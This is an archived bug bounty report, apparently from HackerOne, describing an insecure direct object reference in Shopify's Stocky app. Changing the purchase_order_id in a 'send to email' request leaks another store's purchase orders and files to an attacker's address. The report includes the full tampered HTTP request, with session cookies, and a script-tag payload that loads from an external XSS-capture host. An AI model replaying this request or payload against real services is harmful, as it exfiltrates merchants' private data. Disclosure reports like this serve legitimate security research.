# Disclose Any Store products, Files, Purchase Orders Via Email through Shopify Stocky APP 

## Report Details
- **Report ID**: 763994
- **URL**: https://hackerone.com/reports/763994
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-12-24T11:06:23.754Z
- **Disclosed**: 2020-02-02T17:37:13.902Z

## Reporter
- **Username**: securitzboy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hello Shopify Security Team!
 
##Bug Summary:

This bug leads to disclose any store products, files, purchase orders through shopify stocky app. It is bug in shopify app but it effects stores also.

##Reproduction steps:


Go to apps.shopify.com and install the stocky app.

Now you will be redirected to this page after installing https://app.stockyhq.com

Go to the purchase order for example like this https://app.stockyhq.com/purchase_orders/466435


create a purchase order for this attack.

Click send to email as shown in the below image.


On the burp intercept and click send. as shown in the below image.

{F667632}

##Request:

`POST /messages HTTP/1.1
Host: app.stockyhq.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.stockyhq.com/purchase_orders/466435
Content-Type: application/x-www-form-urlencoded
Content-Length: 646
Origin: https://app.stockyhq.com
Connection: close
Cookie: _stockyhq_session=Q3dKSlN1S1BYSWNEOGoxKzVCeXVJT29HaE5aYVNmaVgrT0NnV3l3eVMzSjlzdk5OTFJ2bjVWZVZiM0t4OG82RnBWcHg5cnB3MTNOTEtFNzFMM0gvSVNwQUxmY1c0VVovTDhkQ0hFWGcxc2l2a2NRU2lvbUZ3cC8wdUl6bjJjemtQczNHMlV5Q3crK3VqVmxYKzdGOWhWL255VmNEd0g0a2FjL05yakZZV3JpVlY1RVBJbHNsWjhiMmFjR0JsVi9qTm9iSzVEYnZvR0J2TE95U0N3K2RuWWpDMVpmZlpNRjNGSmZIZXNzRlBGRDYxNSsrL3dQRnpFL2FZTW1RTE9zOW1MN0hhaWNUY04rd1plME9ZbzZsNmNXaFJkZXRubFZvVlk5dEErOFNaMFpkMFFTOEptaFVRcVhmME5vbmRpdUpvK01Pc1RseVVXUk5WcU1DOGtvV3FJSW9iS1VaMEp4UXZrTjFXcjVLZjFJcWRDaS9TL1JlY2oxOGtnaTRpdXZOZVRzSnl1bjF6bjcyRVArcGVJRGRmZz09LS02cFVGakNuTER4YXlMTE5zYkxWVWlBPT0%3D--52088604b0f927614f94f7cc045ba7a7474852bb; __insp_wid=391133146; __insp_slim=1577174995494; __insp_nv=true; __insp_targlpu=aHR0cHM6Ly9hcHAuc3RvY2t5aHEuY29tLz9obWFjPTk1ZjQ5MWI3ZWFiZDU4OTQ4Y2I5MmYxODdhYmFjYjRmNTA5YWFmYThmNTBmM2M0ZjcwYjE4Y2FhNzk2MGFjNDUmc2hvcD1pdHNteWxpZmUyMDE5Lm15c2hvcGlmeS5jb20mdGltZXN0YW1wPTE1NzcxNzI1MTQ%3D; __insp_targlpt=RGFzaGJvYXJkIHwgU3RvY2t5; __insp_identity=aXRzbXlsaWZlMjAxOS5teXNob3BpZnkuY29t; __insp_pad=11; __insp_sid=1437838064; __insp_uid=1323236377
Upgrade-Insecure-Requests: 1`

`utf8=%E2%9C%93&authenticity_token=nm993QJowhaY9vKB1Ewolb7KFfsgIaP%2FnpO04NR3dQDmJtbzmbtBNioQkEdURN%2FdzdAFGqXxDqR1Ji%2Bm25NwTg%3D%3D&message%5Bto%5D=attackersemail%40gmail.com&message%5Breply_to%5D=attackersemail%40gmail.com&message%5Bsubject%5D=%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fvijayvz.xss.ht%3E%3C%2Fscript%3E&message%5Bbody%5D=Hi+%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fvijayvz.xss.ht%3E%3C%2Fscript%3E%2C%0D%0A%0D%0APlease+find+attached+purchase+order+1000.%0D%0A%0D%0AIf+you+have+any+questions+please+let+me+know.%0D%0A%0D%0AThanks%2C%0D%0A%0D%0Aitsmylife2019+Admin%0D%0A&message%5Battach_csv%5D=0&message%5Bpurchase_order_id%5D=VICTIMID&commit=Send``


###Change the purchase order id=VICTIM ID and email=attackers email.



##Response

`HTTP/1.1 302 Found
Server: Cowboy
Connection: close
Date: Tue, 24 Dec 2019 10:19:16 GMT
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Location: https://app.stockyhq.com/purchase_orders/466435
P3p: CP="Not used"
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache`



###Email will be sent to the attackers email containing files, images, purchase orders pdf.

view the below image.


{F667634}


victim store purchase order pdf 

{F667635}

## Impact

Disclose any store files, images, documents, purchase orders through stocky app.

Thanks!

## Attachments
- On_the_Burp_intercept_to_clock_send.png
- Discloses_Files__Purchase_Orders_and_other_important_information.png
- Victim_Store_Purchase_Order.png
